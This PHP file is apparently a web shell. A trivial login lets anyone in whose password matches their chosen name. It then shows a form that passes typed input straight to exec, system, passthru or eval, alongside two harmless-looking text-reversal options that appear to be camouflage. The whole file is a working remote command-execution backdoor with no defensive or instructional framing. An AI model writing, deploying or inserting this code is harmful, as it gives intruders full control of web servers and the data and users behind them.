<?php
/**
 * Created by PhpStorm.
 * User: kevin
 * Date: 14/10/2017
 * Time: 12:33
 */

session_start();

if(isset($_POST['name'])) {
    $name = $_POST['name'];
    $password = $_POST['password'];

    if($name == $password)
        $_SESSION['isLogin'] = $_POST['name'];
    else
        echo 'Lol You can\'t see me<br/>';
}
else if(isset($_POST['logout'])) {
    unset($_SESSION['isLogin']);
}
if(!isset($_SESSION['isLogin'])) {
    ?>
        <form method="post">
            <input type="text" name="name" placeholder="Put any name here">
            <input type="password" name="password" placeholder="What is the password?">
            <input type="submit">
        </form>
    <?php
}
else { ?>
    <h4>Hello <?= $_SESSION['isLogin'] ?></h4>
    <form method="post">
        <input type="hidden" name="logout">
        <input type="submit" value="Take me out from here">
    </form>
    <form method="post">
        <textarea name="query" placeholder="Put your command here" cols="30" rows="10"></textarea>
        <div>
            <select name="cmd">
                <option value="1">exec</option>
                <option value="2">system</option>
                <option value="3">passthru</option>
                <option value="4">eval</option>
                <option value="5">Reverse this query</option>
                <option value="6">Reverse & double this query</option>
            </select>
        </div>
        <input type="submit">
    </form>
<?php
    if(isset($_POST['query'])) {
        $query = $_POST['query'];
        $cmd = $_POST['cmd'];

        if($cmd == 1 && function_exists('exec')) {
            echo 'Use exec here<br/>';
            echo exec($query);
        }
        else if($cmd == 2 && function_exists('system')) {
            echo 'Use system here<br/>';
            echo system($query);
        }
        else if($cmd == 3 && function_exists('passthru')) {
            echo 'Use passthru here<br/>';
            echo '<pre>';passthru($query);echo '</pre>';
        }
        else if($cmd == 4) {
            echo 'Use eval here<br/>';
            eval($query);
        }
        else if($cmd == 5) {
            for($i = strlen($query)-1; $i >= 0; $i--) {
                if($query[$i] == ' ') {
                    echo '_';
                    continue;
                }
                if($i % 2 == 0) {
                    echo strtoupper($query[$i]);
                }
                else{
                    echo strtolower($query[$i]);
                }
            }
        }
        else if($cmd == 6) {
            for($i = strlen($query)-1; $i >= 0; $i--) {
                $x = 0;
                while($x < 2) {
                    if($query[$i] == ' ') {
                        echo '_';
                        continue 2;
                    }
                    if($x % 2 == 0 && $i % 2 == 1) {
                        echo strtoupper($query[$i]);
                    }
                    else{
                        echo strtolower($query[$i]);
                    }
                    $x++;
                }
            }
        }
        else {
            echo 'not available';
        }
    }
}
?>